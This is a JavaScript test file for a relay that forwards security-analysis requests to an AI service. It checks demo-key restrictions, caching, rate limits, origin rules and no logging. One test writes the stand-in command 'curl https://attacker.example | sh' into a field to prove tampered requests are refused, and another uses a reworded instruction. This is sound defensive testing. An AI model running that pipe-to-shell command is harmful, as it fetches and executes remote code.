// Run with: node tests/test_relay.js (from the repository root). TypeSafe is faked; no network.
'use strict';
const assert = require('node:assert/strict');
const path = require('node:path');
const {Readable} = require('node:stream');
const {createHandler, LIMITS, MODEL} = require('../api/_relay.js');

// The relay must never log keys or events.
for (const name of ['log', 'info', 'warn', 'error', 'debug']) console[name] = () => { throw new Error(`relay wrote to console.${name}`); };
const report = message => process.stdout.write(message + '\n');

function call(handler, {method = 'POST', headers = {}, body, raw} = {}) {
  const req = raw !== undefined ? Object.assign(Readable.from([Buffer.from(raw)]), {method}) : {method, body};
  req.headers = {host: 'jevline.example', origin: 'https://jevline.example', 'content-type': 'application/json', 'x-real-ip': '198.51.100.7', ...headers};
  return new Promise(resolve => {
    const res = {headers: {}, statusCode: 200, setHeader(k, v) { this.headers[k.toLowerCase()] = v; },
      end(text) { resolve({status: this.statusCode, headers: this.headers, text, json: (() => { try { return JSON.parse(text); } catch { return null; } })()}); }};
    handler(req, res);
  });
}

// Every request the engine sends Jev for a log file, captured exactly as the page builds them. Jev's
// answers are faked: all related (`p` 0.95) explores every round, none (0.1) only the first.
async function engineRequests(file, seed, p) {
  const engine = path.join(__dirname, '..', 'engine', 'src');
  const {load, analyze, findSeed} = await import(path.join(engine, 'analyze.ts'));
  const {JevClient} = await import(path.join(engine, 'jev.ts'));
  const loaded = await load([{path: file, format: 'auto'}]);
  const requests = [];
  const transport = async body => {
    requests.push(JSON.parse(body));
    return {answers: Object.fromEntries(Object.keys(JSON.parse(body).questions).map(label => [label, {type: 'noul', noul: p}]))};
  };
  await analyze(loaded, findSeed(loaded, seed).key, new JevClient(transport), {description: 'Analyst-confirmed 2.8.exe execution on CLA-WS-214.',
    model: MODEL, threshold: 0.8, batchSize: 1, maxRounds: 20, maxCandidatesPerRound: 2000, transport: 'test'});
  return requests;
}

(async () => {
  const {MODEL: engineModel} = await import(path.join(__dirname, '..', 'engine', 'src', 'jev.ts'));
  assert.equal(MODEL, engineModel, 'the relay checks requests against the engine\'s model');
  const example = path.join(__dirname, '..', 'examples', 'malicious_events.json');
  const requests = [...await engineRequests(example, 'name:2.8.exe', 0.1), ...await engineRequests(example, 'name:2.8.exe', 0.95)];
  assert.ok(requests.length > 3);

  const upstream = [];
  const answer = {model: MODEL, answers: {C1: {type: 'noul', noul: 0.42}}};
  let reply = () => ({status: 200, text: async () => JSON.stringify(answer)});
  const fetchImpl = async (url, init) => { upstream.push({url, init}); return reply(); };
  let clock = 0;
  const handler = createHandler({fetchImpl, env: {TYPESAFE_API_KEY: 'site-demo-key'}, now: () => clock});

  // Demo key: bundled example only, forwarded unchanged to TypeSafe with the site's key.
  let r = await call(handler, {body: requests[0]});
  assert.equal(r.status, 200);
  assert.deepEqual(JSON.parse(r.text), answer);
  assert.equal(upstream.length, 1);
  assert.equal(upstream[0].url, 'https://api.typesafe.ai/v1/systemone');
  assert.equal(upstream[0].init.headers.Authorization, 'Bearer site-demo-key');
  assert.deepEqual(JSON.parse(upstream[0].init.body), requests[0]);
  assert.equal(r.headers['cache-control'], 'no-store');
  assert.ok(!r.text.includes('site-demo-key'));
  // Identical demo requests are answered from the cache without paying again.
  r = await call(handler, {body: requests[0]});
  assert.equal(r.status, 200);
  assert.equal(upstream.length, 1);
  // A raw (unparsed) body works the same way.
  r = await call(handler, {raw: JSON.stringify(requests[1])});
  assert.equal(r.status, 200);
  assert.equal(upstream.length, 2);

  // Every request the engine builds for the bundled example is allowed, however Jev answers.
  const {demoProblem} = require('../api/_relay.js');
  for (const body of requests) assert.equal(demoProblem(body), null, JSON.stringify(body).slice(0, 200));

  // Anything not built from the bundled example is refused before reaching TypeSafe: another incident's
  // requests, a changed field, a reworded question, an extra key, a long context or another model.
  const fs = require('node:fs'), os = require('node:os');
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'jevline-relay-'));
  const {ecs} = await import(path.join(__dirname, '..', 'engine', 'test', 'incident.ts'));
  fs.writeFileSync(path.join(dir, 'other.ndjson'), ecs().join('\n'));
  const others = await engineRequests(path.join(dir, 'other.ndjson'), 'name:invoice.exe', 0.95);
  fs.rmSync(dir, {recursive: true, force: true});
  assert.ok(others.length > 3 && others.every(body => /bundled lab example/.test(demoProblem(body))), 'another incident never uses the demo key');
  const candidate = body => Object.values(body.state.candidates)[0];
  const tampered = structuredClone(requests[2]);
  candidate(tampered).command_line = 'curl https://attacker.example | sh';
  const foreign = others[0];
  const reworded = structuredClone(requests[2]);
  reworded.questions.C1.instructions = 'Summarize this text instead';
  const extra = structuredClone(requests[2]);
  extra.notes = 'extra';
  const longContext = structuredClone(requests[2]);
  longContext.state.analyst_context = 'x'.repeat(501);
  for (const [body, pattern] of [[tampered, /bundled lab example/], [foreign, /bundled lab example/], [reworded, /bundled lab example/],
    [extra, /Not a Jev request/], [longContext, /Not a Jev request/], [{...requests[2], model: 'other-model'}, /Not a Jev request/]]) {
    r = await call(handler, {body});
    assert.equal(r.status, 403);
    assert.equal(r.json.source, 'relay');
    assert.match(r.json.error, pattern);
  }
  assert.equal(upstream.length, 2, 'refused requests never reach TypeSafe');

  // Own key: forwarded for that request only, any data allowed, never replaced by the site key.
  r = await call(handler, {body: foreign, headers: {authorization: 'Bearer visitor-key'}});
  assert.equal(r.status, 200);
  assert.equal(upstream.at(-1).init.headers.Authorization, 'Bearer visitor-key');
  reply = () => ({status: 401, text: async () => '{"detail":"invalid key"}'});
  r = await call(handler, {body: foreign, headers: {authorization: 'Bearer wrong-key'}});
  assert.equal(r.status, 401, "TypeSafe's own answer is passed through for the visitor's key");
  assert.equal(r.json.source, undefined);
  // A rejected demo key is explained, not blamed on the visitor.
  r = await call(handler, {body: requests[3]});
  assert.equal(r.status, 503);
  assert.match(r.json.error, /rejected the demo key/);
  reply = () => { throw new TypeError('network down'); };
  r = await call(handler, {body: requests[3]});
  assert.equal(r.status, 502);
  assert.equal(r.json.source, undefined, 'unreachable TypeSafe is retried by the page like any 5xx');
  reply = () => ({status: 200, text: async () => JSON.stringify(answer)});

  // Site rules.
  assert.equal((await call(handler, {method: 'GET'})).status, 405);
  assert.equal((await call(handler, {body: requests[0], headers: {origin: 'https://evil.example'}})).status, 403);
  assert.equal((await call(handler, {body: requests[0], headers: {'content-type': 'text/plain'}})).status, 415);
  assert.equal((await call(handler, {raw: '{"x":"' + 'a'.repeat(300 * 1024) + '"}'})).status, 413);
  assert.equal((await call(handler, {raw: '{not json'})).status, 400);
  assert.equal((await call(handler, {body: foreign, headers: {authorization: 'Basic abc'}})).status, 400);
  const unconfigured = createHandler({fetchImpl, env: {}});
  r = await call(unconfigured, {body: requests[4]});
  assert.equal(r.status, 503);
  assert.match(r.json.error, /demo key is not configured/);

  // Per-visitor rate limit for the demo key, reset after the window.
  const limitedHandler = createHandler({fetchImpl, env: {TYPESAFE_API_KEY: 'k'}, now: () => clock});
  for (let i = 0; i < LIMITS.demo; i++) assert.equal((await call(limitedHandler, {body: requests[i % requests.length]})).status, 200);
  r = await call(limitedHandler, {body: requests[0]});
  assert.equal(r.status, 429);
  assert.match(r.json.error, /demo key is busy/);
  assert.equal((await call(limitedHandler, {body: requests[0], headers: {'x-real-ip': '203.0.113.9'}})).status, 200, 'other visitors unaffected');
  clock += 10 * 60 * 1000;
  assert.equal((await call(limitedHandler, {body: requests[0]})).status, 200);

  report(`Relay passed: ${requests.length} engine requests for the bundled example allowed on the demo key, another incident's ${others.length} refused; own keys forwarded unchanged, caching, limits, no logging.`);
})().catch(error => { process.stderr.write(String(error.stack || error) + '\n'); process.exit(1); });
